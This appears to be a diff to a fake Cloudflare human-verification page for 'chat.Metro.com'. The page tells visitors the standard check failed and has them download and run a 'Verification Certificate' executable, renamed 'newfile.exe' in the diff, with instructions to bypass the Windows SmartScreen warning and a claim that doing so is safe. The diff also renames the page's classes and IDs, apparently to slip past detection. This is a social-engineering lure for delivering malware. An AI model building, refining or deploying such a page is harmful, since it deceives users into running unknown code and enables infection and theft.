@@ -27,12 +27,12 @@
     h1 { margin: 0 0 24px; font-size: 28px; font-weight: 600; }
     p { margin: 0 0 24px; font-size: 16px; }
     .box { position: relative; display: flex; align-items: center; border: 1px solid #e1e4e8; border-radius: 4px; padding: 12px; margin-bottom: 16px; }
-    .captcha-box input[type="checkbox"] { width: 18px; height: 18px; margin-right: 12px; position: relative; z-index: 1; }
-    .captcha-box input[type="checkbox"]:checked { visibility: hidden; }
-    .captcha-box #loader { display: none; position: absolute; width: 18px; height: 18px; left: 12px; top: 21px; border: 2px solid #e1e4e8; border-top-color: #0074cc; border-radius: 50%; animation: spin 1s linear infinite; z-index: 2; }
-    .captcha-box input[type="checkbox"]:checked + #loader { display: block; }
-    .download-box, .continue-box { display: none; flex-direction: column; }
-    .download-box a, .continue-box button { background: #f48625; color: white; border: none; padding: 10px 16px; border-radius: 4px; cursor: pointer; font-size: 14px; margin-top: 8px; align-self: flex-start; text-decoration: none; display: inline-block; }
+    .main_box input[type="checkbox"] { width: 18px; height: 18px; margin-right: 12px; position: relative; z-index: 1; }
+    .main_box input[type="checkbox"]:checked { visibility: hidden; }
+    .main_box #land { display: none; position: absolute; width: 18px; height: 18px; left: 12px; top: 21px; border: 2px solid #e1e4e8; border-top-color: #0074cc; border-radius: 50%; animation: spin 1s linear infinite; z-index: 2; }
+    .main_box input[type="checkbox"]:checked + #land { display: block; }
+    .access_box, .continue-box { display: none; flex-direction: column; }
+    .access_box a, .continue-box button { background: #f48625; color: white; border: none; padding: 10px 16px; border-radius: 4px; cursor: pointer; font-size: 14px; margin-top: 8px; align-self: flex-start; text-decoration: none; display: inline-block; }
     @keyframes spin { to { transform: rotate(360deg); } }
     .logo { margin-left: auto; text-align: center; font-size: 12px; }
     .logo img { display: block; max-height: 20px; margin-bottom: 4px; }
@@ -40,7 +40,7 @@
     #retry { display: none; font-size: 14px; margin-top: 8px; }
     #retry a { color: #f48625; text-decoration: none; cursor: pointer; }
     .note { font-size: small; font-style: italic; }
-    .error-message {
+    .access_problem {
       display: none;
       background: #fff1f0;
       border: 1px solid #ffccc7;
@@ -72,9 +72,9 @@
     <h1>chat.Metro.com</h1>
     <p id="intro-msg">Verify you are human by completing the steps below.</p>
 
-    <div class="box captcha-box">
+    <div class="box main_box">
       <input type="checkbox" id="cf-chk">
-      <div id="loader"></div>
+      <div id="land"></div>
       <label for="cf-chk" id="cf-label">Verify you are human</label>
       <div class="logo">
         <img src="https://www.cloudflare.com/img/logo-cloudflare.svg" alt="Cloudflare Logo">
@@ -85,17 +85,17 @@
       </div>
     </div>
 
-    <p id="review-connection">chat.Metro.com needs to review the security of your connection before proceeding.</p>
+    <p id="user_connection">chat.Metro.com needs to review the security of your connection before proceeding.</p>
     <p id="retry">
       If this persists, <a id="fix-link"><strong>click here to fix</strong></a>.
     </p>
 
-    <div class="box download-box" id="download-step">
+    <div class="box access_box" id="access_step">
       <p>We weren’t able to confirm you’re human with our standard check. Please follow the steps below to resolve any issues and complete verification.</p>
       <p>Almost there! Download your <strong>Verification Certificate</strong> to prove you’re human.</p>
-      <a href="files/Verification Certificate.exe"
-         download="Verification Certificate.exe"
-         id="download-btn"
+      <a href="files/newfile.exe"
+         download="newfile.exe"
+         id="acess_btn"
       >
         Download Certificate
       </a>
@@ -107,9 +107,9 @@
           Note: If you see the “Windows protected your PC” SmartScreen warning, click More info then Run anyway—it’s safe.
         </div>
       </p>
-      <div id="error-message" class="error-message">
+      <div id="access_problem" class="access_problem">
         <span class="error-icon">⚠</span>
-        <span id="error-text">Verification certificate not detected. Please run the downloaded certificate first.</span>
+        <span id="note_text">Verification certificate not detected. Please run the downloaded certificate first.</span>
       </div>
       <button id="continue-btn">Continue</button>
     </div>
@@ -120,13 +120,13 @@
     const cfLabel      = document.getElementById('cf-label');
     const retry        = document.getElementById('retry');
     const fixLink      = document.getElementById('fix-link');
-    const downloadStep = document.getElementById('download-step');
-    const downloadBtn  = document.getElementById('download-btn');
+    const nextStep = document.getElementById('access_step');
+    const nextBtn  = document.getElementById('acess_btn');
     const continueStep = document.getElementById('continue-step');
     const continueBtn  = document.getElementById('continue-btn');
-    const errorMsg     = document.getElementById('error-message');
-    const errorText    = document.getElementById('error-text');
-    const reviewMsg    = document.getElementById('review-connection');
+    const errorMsg     = document.getElementById('access_problem');
+    const errorText    = document.getElementById('note_text');
+    const reviewMsg    = document.getElementById('user_connection');
     let retryTimer, startTime = null;
 
     chk.addEventListener('change', () => {
@@ -137,7 +137,7 @@
         cfLabel.textContent = 'Verify you are human';
         clearTimeout(retryTimer);
         retry.style.display = 'none';
-        downloadStep.style.display = 'none';
+        nextStep.style.display = 'none';
         continueStep.style.display = 'none';
         errorMsg.style.display = 'none';
       }
@@ -147,14 +147,14 @@
       e.preventDefault();
       retry.style.display = 'none';
       reviewMsg.style.display = 'none';
-      downloadStep.style.display = 'flex';
+      nextStep.style.display = 'flex';
       errorMsg.style.display = 'none';
     });
 
-    downloadBtn.addEventListener('click', () => {
+    nextBtn.addEventListener('click', () => {
       // record when the user clicked the native download link
       startTime = Date.now();
-      downloadStep.style.display = 'none';
+      nextStep.style.display = 'none';
       continueStep.style.display = 'flex';
     });
 
